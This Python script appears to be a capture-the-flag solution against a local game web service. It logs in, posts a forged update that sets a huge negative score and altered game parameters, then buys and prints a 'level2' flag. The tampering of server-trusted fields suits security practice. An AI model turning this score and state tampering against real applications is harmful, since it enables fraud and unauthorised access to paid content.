from requests import session
from os import urandom
import readline

url = "http://localhost"
s = session()
uname = urandom(10).hex()

# get access token
token = s.post(f"{url}/login", json={"name": uname}).json()["access_token"]
print(f"Got access token '{token}' for {uname}")

# login
stat = s.post(f"{url}/login", json={"name": uname, "access_token": token}).json()["status"]
assert(stat == "success")

# ask for the endpoint
print(f"Navigate to {url}/docs")
endp = input("What is the endpoint for level2 flag? ").strip()

# set our score
res = s.post(f"{url}/update", json={
	"score": -1337133713371337,
	"bullet_cooldown": 1,
    "spawn_frequency": 1,
    "speed": 1
}).json()
assert(res["detail"] == "succeeded")

# purchase the level2 flag, then view
s.get(f"{url}/{endp}")
print(s.get(f"{url}/purchased_flag").json()["flag"])